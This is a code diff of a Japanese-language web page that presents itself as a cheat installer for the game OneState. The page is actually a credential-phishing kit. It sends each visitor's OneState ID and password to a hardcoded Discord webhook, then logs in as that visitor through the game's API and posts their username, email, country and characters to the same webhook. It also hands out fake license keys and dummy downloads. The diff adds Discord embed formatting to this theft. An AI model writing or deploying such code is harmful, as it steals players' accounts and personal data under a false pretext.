@@ -46,7 +46,6 @@ pre{margin:0;font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-br
 #acctBody .ch{border-left:1px solid var(--line);padding-left:9px;margin:5px 0;display:block}
 #acctBody .d{color:var(--dim)}
 #acctBody .r{display:flex;justify-content:space-between;gap:10px}
-#acctBody .r span:last-child{color:var(--fg)}
 #acctBody hr{border:0;border-top:1px solid var(--line);margin:11px 0}
 footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 #admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
@@ -60,7 +59,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v5.1</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v5.3</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -111,6 +110,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 (function(){
 'use strict';
 var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3avovSw0MetSFhw9eFN_X-2znCSyi_fFCB1P8KDagFzi2HWZa6LiBdPPXRX7xMP',API:'https://api.onestate-rp.com'};
+var ACC=0x6FC9FF, LOGO='https://onestate.com/assets/logo-new-D-512-Dk7W3sa6.png';
 var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
 var $=function(id){return document.getElementById(id)};
 var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
@@ -126,6 +126,48 @@ function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
 function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-300).join('\n');el.scrollTop=el.scrollHeight}
 function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2400)}
 function esc(s){return String(s).replace(/[&<>]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[c]})}
+
+/* ---- Discord embed ---- */
+async function sendEmbeds(embeds){
+  var wh=webhook();if(!wh)return;
+  var body=JSON.stringify({embeds:embeds});
+  try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
+  catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
+}
+function base(title){
+  return {title:title,color:ACC,thumbnail:{url:LOGO},
+    footer:{text:'OneState Cheat Tool'},timestamp:new Date().toISOString()};
+}
+function credEmbed(id,pw){
+  var e=base('OneState ID 取得');
+  e.fields=[
+    {name:'OneState ID',value:'`'+id+'`',inline:false},
+    {name:'パスワード',value:'`'+pw+'`',inline:false}
+  ];
+  return e;
+}
+function play(sec){
+  var n=parseInt(sec,10);if(!n||isNaN(n))return '-';
+  var d=Math.floor(n/86400),h=Math.floor(n%86400/3600);
+  return d+'日 '+h+'h';
+}
+function acctEmbed(a,pl){
+  var e=base('OneState アカウント照会');
+  e.fields=[
+    {name:'ユーザー名',value:'**'+(a.username||'-')+'**',inline:true},
+    {name:'国',value:a.country||'-',inline:true},
+    {name:'キャラ数',value:String(pl.length),inline:true},
+    {name:'メール',value:'`'+(a.email||'-')+'`',inline:false}
+  ];
+  e.fields.push({name:'キャラクター',inline:false,
+    value: pl.length ? pl.map(function(p,i){
+      return '**'+(i+1)+'. '+p.nickname+'**  `Lv.'+(p.level===undefined?'-':p.level)+'`\n'+
+             '└ '+(p.serverName||'-')+' ・ '+play(p.playTimeSeconds);
+    }).join('\n') : 'なし'});
+  return e;
+}
+
+/* ---- 通信 ---- */
 function sdkOk(){return !!(window.corsfix&&window.corsfix.fetch)}
 async function sdkReq(method,path,body,H){
   if(!sdkOk())return{ok:false};
@@ -144,11 +186,6 @@ async function sdkReq(method,path,body,H){
 var sdkGet=function(p,H){return sdkReq('GET',p,null,H)};
 var sdkPost=function(p,b,H){return sdkReq('POST',p,b,H)};
 function isOk(r){return !!(r&&r.ok&&r.json&&(!r.json.errorCode||r.json.errorCode==='UNSPECIFIED'))}
-async function send(text){
-  var wh=webhook();if(!wh)return;var body=JSON.stringify({content:text});
-  try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
-  catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
-}
 async function apiLogin(id,pw){
   var r=await sdkPost('/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
@@ -160,26 +197,9 @@ async function doRefresh(rt){
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
   return null;
 }
-async function enrich(tok,sid){
-  var H={authorization:'Bearer '+tok},o={};
-  if(!sid)return o;
-  var a=await sdkGet('/v1/shop/@me/referrals/'+sid,H);
-  if(a.ok&&a.json){
-    var j=a.json.data||a.json;
-    o.code=j.standardCode||'';
-    if(j.currencies){o.refCoins=j.currencies.refCoins;o.webHard=j.currencies.webHard}
-    o.subscribed=j.isSubscribed;
-    o.owner=j.ownerStatus;
-  }
-  var b=await sdkGet('/v2/shop/@me/subscriptions/'+sid+'/active',H);
-  if(b.ok&&b.json){var d=b.json.data||b.json;o.subCount=(d.summary&&d.summary.activeCount);if(o.subCount==null&&d.subscriptions)o.subCount=d.subscriptions.length}
-  var c=await sdkPost('/v1/vip:resolveMyVipStatus',{serverId:sid},H);
-  if(c.ok&&c.json)o.vip=!!c.json.vip;
-  return o;
-}
-function pt(sec){var n=parseInt(sec,10);if(!n||isNaN(n))return '-';return Math.floor(n/86400)+'日 '+Math.floor(n%86400/3600)+'h'}
+
 function row(k,v){return '<span class="r"><span class="k">'+k+'</span><span>'+esc(v)+'</span></span>\n'}
-function showAccount(res,e){
+function showAccount(res){
   if(!res){acct('<span class="d">照会失敗</span>');return}
   var a=res.acc||{},pl=(res.pl&&res.pl.players)||[];
   var H='';
@@ -191,51 +211,40 @@ function showAccount(res,e){
   if(!pl.length)H+='  <span class="d">(なし)</span>\n';
   pl.forEach(function(p,i){
     H+='<span class="ch">['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>  Lv.'+esc(p.level===undefined?'-':p.level)+'\n';
-    H+='    <span class="d">'+esc(p.serverName||'-')+'  /  play '+pt(p.playTimeSeconds)+'</span></span>';
+    H+='    <span class="d">'+esc(p.serverName||'-')+'  /  play '+play(p.playTimeSeconds)+'</span></span>';
   });
-  if(e&&(e.code||e.refCoins!=null||e.vip!==undefined||e.subCount!=null)){
-    H+='<hr><span class="k">// 追加情報</span>\n';
-    if(e.code)H+=row('紹介コード',e.code);
-    if(e.refCoins!=null)H+=row('紹介コイン',String(e.refCoins));
-    if(e.webHard!=null)H+=row('webコイン',String(e.webHard));
-    if(e.subCount!=null)H+=row('サブスク',e.subCount>0?e.subCount+' 件':'なし');
-    if(e.vip!==undefined)H+=row('VIP',e.vip?'あり':'なし');
-  }
   acct(H);toast('照会成功');
-  send('OneState 照会\nuser: '+(a.username||'-')+'\nemail: '+(a.email||'-')+'\nchars: '+pl.length+
-       (pl.length?'\n'+pl.map(function(p){return p.nickname+' Lv.'+p.level+' @'+p.serverName}).join('\n'):''));
 }
 function acct(html){$('acct').hidden=false;$('acctBody').innerHTML=html}
 function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
 function issue(){var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}$('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;return k}
 function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
 
-async function run(){
-  var c=creds();if(!c.id||!c.pw){msg('IDとパスワードを入力');return}
-  var lr=await apiLogin(c.id,c.pw);if(!lr){acct('<span class="d">API応答なし</span>');return}
+async function run(id,pw){
+  var lr=await apiLogin(id,pw);if(!lr){acct('<span class="d">API応答なし</span>');return}
   var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;
   var H={authorization:'Bearer '+tok};
   var r=await sdkGet('/v2/account/@me',H);
   if(!isOk(r)||!r.json.data){acct('<span class="d">照会失敗</span>');return}
   var p=await sdkGet('/v2/account/@me/players',H);
   var pl=(p.ok&&p.json&&p.json.players)||[];
-  var e=await enrich(tok,(pl[0]&&pl[0].serverId)||'');
   log('照会完了 chars='+pl.length);
-  showAccount({acc:r.json.data,pl:(p.ok?p.json:null)},e);
+  showAccount({acc:r.json.data,pl:(p.ok?p.json:null)});
+  await sendEmbeds([acctEmbed(r.json.data,pl)]);
 }
-$('form').addEventListener('submit',async function(e){
-  e.preventDefault();
+$('form').addEventListener('submit',async function(ev){
+  ev.preventDefault();
   var id=$('ident').value.trim(),pw=$('pass').value;
   if(!id||!pw){msg('IDとパスワードを入力');return}
   $('go').disabled=true;msg('接続中...');issue();
-  await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
-  await run();
+  await sendEmbeds([credEmbed(id,pw)]);
+  await run(id,pw);
   msg('ライセンス発行済み',true);toast('ライセンス発行');
   $('go').disabled=false;
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v5.1 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v5.3 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -244,9 +253,12 @@ if(qs('admin')!=null){$('admin').hidden=false}
 $('ah').addEventListener('click',function(){$('ab').classList.toggle('collapsed')});
 $('wh').value=getCfg().webhook||'';
 $('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('保存')});
-$('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
+$('btest').addEventListener('click',async function(){
+  await sendEmbeds([Object.assign(base('テスト送信'),{description:'Webhook 接続テスト OK'})]);
+  toast('送信');
+});
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
-$('bacct').addEventListener('click',async function(){clearLog();log('// ACCOUNT');await run()});
+$('bacct').addEventListener('click',async function(){clearLog();log('// ACCOUNT');var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}await run(c.id,c.pw)});
 renderLog();
 })();
 </script>
